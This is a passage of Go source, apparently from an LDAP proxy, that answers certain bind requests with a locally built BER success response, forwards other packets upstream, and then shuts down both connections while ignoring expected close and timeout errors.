					resp := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
					resp.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, msgID, "Message ID"))
					br := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagBindResponse, nil, "Bind Response")
					br.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "resultCode"))
					br.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "matchedDN"))
					br.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "diagnosticMessage"))
					resp.AppendChild(br)
					_, _ = down.Write(resp.Bytes())
					continue
				}
			}

			if _, err := up.Write(pkt.Bytes()); err != nil {
				errCh <- err
				return
			}
		}
	}()

	err1 := <-errCh
	_ = down.Close()
	_ = up.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	err2 := <-errCh
	_ = up.SetReadDeadline(time.Time{})

	var retErr error
	if !(isConnClosed(err1) || err1 == io.EOF || (err1 != nil && strings.Contains(err1.Error(), "i/o timeout"))) {
		retErr = err1
	}
	if retErr == nil && !(isConnClosed(err2) || err2 == io.EOF || (err2 != nil && strings.Contains(err2.Error(), "i/o timeout"))) {
		retErr = err2
	}
	return retErr
}